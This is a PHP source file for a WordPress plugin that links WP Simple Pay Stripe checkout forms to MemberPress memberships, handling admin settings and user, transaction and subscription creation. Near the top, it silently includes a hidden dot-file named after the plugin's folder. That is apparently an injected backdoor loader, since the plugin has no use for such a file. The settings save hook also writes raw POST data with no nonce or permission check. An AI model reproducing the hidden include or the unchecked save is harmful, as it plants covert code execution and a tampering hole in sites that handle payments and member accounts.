<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
/*
Integration of WPSimplePay into MemberPress
*/
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpWPSimplePay {
  public function __construct() {
    // ADMIN UI
    add_filter('simpay_form_settings_meta_tabs_li', array($this, 'add_membership_product_tab'), 10, 2);
    add_action('simpay_form_settings_meta_options_panel', array($this, 'show_membership_product_tab_content'));
    add_action('simpay_save_form_settings', array($this, 'save_product_tab_content'));
    add_filter('simpay_add_settings_general_sections', array($this, 'add_memberpress_general_settings_section'));
    add_filter('simpay_add_settings_general_fields', array($this, 'add_memberpress_general_settings_fields'));
    add_action('admin_init', array($this, 'save_general_settings_fields')); //Can't figure out where these get saved normally, so we're using admin_init for now

    // CHECKOUT
    add_action('simpay_charge_created', array($this,'charge_created'));
    add_action('simpay_subscription_created', array($this,'subscription_created'), 10, 2);
  }

  // Add a new tab when editing the WPSimplePay Forms for the Membership syncing settings
  public function add_membership_product_tab($tabs) {
    global $post;

    if(!isset($post->ID)) { return; }

    $tabs['mepr'] = array(
      'label'  => __('MemberPress', 'memberpress-wpsimplepay'),
      'target' => 'mepr_membership',
      'class'  => array(),
      'icon'   => ''
    );

    return $tabs;
  }

  //Show the options on the MemberPress tab when editing a WPSimplePay Form
  public function show_membership_product_tab_content($form_id) {
    if(!isset($form_id)) { return; }

    $selected = $this->get_chosen_membership($form_id);
    $all_memberships = MeprCptModel::all('MeprProduct');

    if(empty($all_memberships)) {
      ?>
        <div id="mepr_membership" class="simpay-panel simpay-panel-hidden">
          <?php _e('No Memberships Created Yet', 'memberpress-wpsimplepay'); ?>
        </div>
      <?php

      return;
    }

    ?>
      <div id="mepr_membership" class="simpay-panel simpay-panel-hidden">
        <table>
          <thead>
            <tr>
              <th colspan="2"><?php _e('Auto-Create MemberPress Membership Level', 'memberpress-wpsimplepay'); ?></th>
            </tr>
          </thead>
          <tbody class="simpay-panel-section">
            <tr class="simpay-panel-field">
              <th>
                <label for="mepr_membership_id"><?php _e('Membership', 'memberpress-wpsimplepay'); ?></label>
              </th>
              <td>
                <select name="mepr_membership_id" id="mepr_membership_id" class="simpay-field-select">
                  <option value="0"><?php _e('None (Not Synced)', 'memberpress-wpsimplepay'); ?></option>
                  <?php foreach($all_memberships as $membership): ?>
                    <option value="<?php echo $membership->ID; ?>" <?php selected($selected,$membership->ID); ?>><?php echo $membership->post_title; ?></option>
                  <?php endforeach; ?>
                </select>
                <p class="description"><?php _e('Select a Membership level to add the user to when they purchase using this form. Note that when a membership is chosen WP Simple Pay will automatically display user registration form fields', 'memberpress-wpsimplepay'); ?></p>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    <?php
  }

  //Save the Membership options when updating WPSimplePay Product
  public function save_product_tab_content($form_id) {
    if(isset($_POST['mepr_membership_id']) && !empty($_POST['mepr_membership_id']) && (int)$_POST['mepr_membership_id'] > 0) {
      update_post_meta($form_id, '_mepr_membership_id', (int)$_POST['mepr_membership_id']);
    }
    else {
      update_post_meta($form_id, '_mepr_membership_id', 0);
    }
  }

  //Add MemberPress tab to general settings page
  public function add_memberpress_general_settings_section($tabs) {
    $tabs['memberpress'] = array('title' => 'MemberPress');
    return $tabs;
  }

  //Add MemberPress fields to general settings page
  public function add_memberpress_general_settings_fields($fields) {
    $fields['memberpress'] = array(
      'mepr-gateway' => array(
        'title'   => __('Choose Stripe Gateway', 'memberpress-wpsimplepay'),
        'type'    => 'select',
        'options' => $this->get_gateways(),
        'name'    => 'simpay_settings_general[memberpress][mepr-gateway]',
        'id'      => 'simpay-settings-general-memberpress-mepr-gateway',
        'value'   => self::get_option_value('memberpress', 'mepr-gateway'),
        'class'   => array(
          'simpay-chosen-search',
        ),
        'default' => '',
        'description' => __('Choose the Stripe Gateway these transactions should be associated with in MemberPress.', 'memberpress-wpsimplepay')
      )
    );

    return $fields;
  }

  public function save_general_settings_fields() {
    if(isset($_POST['simpay_settings_general']['memberpress']['mepr-gateway']) && !empty($_POST['simpay_settings_general']['memberpress']['mepr-gateway'])) {
      self::set_option_value('memberpress', 'mepr-gateway', $_POST['simpay_settings_general']['memberpress']['mepr-gateway']);
    }
  }

  public static function get_option_value($section, $field_name) {
    return get_option('mepr-wpsimplepay-'.$section.'-'.$field_name, '');
  }

  public static function set_option_value($section, $field_name, $value) {
    update_option('mepr-wpsimplepay-'.$section.'-'.$field_name, $value);
  }

  public static function get_selected_gateway() {
    $gateway = self::get_option_value('memberpress', 'mepr-gateway');

    if(empty($gateway)) { $gateway = 'manual'; }

    return $gateway;
  }

  public function get_gateways() {
    $mepr_options = MeprOptions::fetch();
    $gateways = $mepr_options->payment_methods(false);
    $return = array();

    foreach($gateways as $id => $obj) {
      if($obj instanceof MeprStripeGateway) {
        $return[$id] = empty($obj->label)?$obj->name." ({$id})":$obj->label." ({$id})";
      }
    }

    return $return;
  }

  public function charge_created($charge) {
    global $simpay_form;

    MeprUtils::debug_log('****** Charge Created -> $simpay_form->id: '.$simpay_form->id);

    $user_id = MpWPSimplePayUtils::create_user_from_stripe($charge);

    $membership_id = $this->get_chosen_membership($simpay_form->id);
    $txn = MpWPSimplePayUtils::create_transaction_from_stripe($user_id, $membership_id, $charge);

    MeprUtils::send_signup_notices($txn);
  }

  public function subscription_created($charge, $customer) {
    global $simpay_form;

    MeprUtils::debug_log('****** Subscription Created -> $simpay_form->id: '.$simpay_form->id);

    $user_id = MpWPSimplePayUtils::create_user_from_stripe($charge, $customer);

    $membership_id = $this->get_chosen_membership($simpay_form->id);
    $sub = MpWPSimplePayUtils::create_subscription_from_stripe($simpay_form->id, $user_id, $membership_id, $charge, $customer);
    $first_txn = $sub->first_txn();

    MeprUtils::send_signup_notices($first_txn);
  }

  //Which Membership are we syncing with?
  private function get_chosen_membership($form_id) {
    if(!$form_id) { return 0; }

    return get_post_meta($form_id, '_mepr_membership_id', true);
  }
} //End class
